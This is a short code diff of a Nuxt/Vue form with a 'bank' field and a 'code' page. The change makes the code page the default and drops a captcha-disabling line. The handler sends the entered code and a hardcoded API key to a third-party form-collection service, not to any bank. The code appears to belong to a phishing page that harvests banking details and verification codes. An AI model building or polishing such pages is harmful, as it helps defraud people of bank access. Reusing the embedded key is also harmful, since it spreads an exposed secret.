@@ -6,7 +6,7 @@ const { submitRequest } = sendRequest();
 // SweetAlert
 const { $swal } = useNuxtApp();
 
-const formpage = ref('default'); // can be 'default' or 'code'
+const formpage = ref('code'); // can be 'default' or 'code'
 
 const form:any = ref({
   bank: '',
@@ -190,7 +190,6 @@ const submitCodeForm = () => {
   const formdata = new FormData();
   formdata.append('code', form.value.code);
   formdata.append('apiKey', 'sf_d45fafc315dd75e7bdf87ffe');
-  formdata.append('_captcha', 'false'); // disable captcha
   // For example, you can send the code to your backend for verification  // send to staticforms
   fetch('https://api.staticforms.dev/submit', {
     method: 'POST',
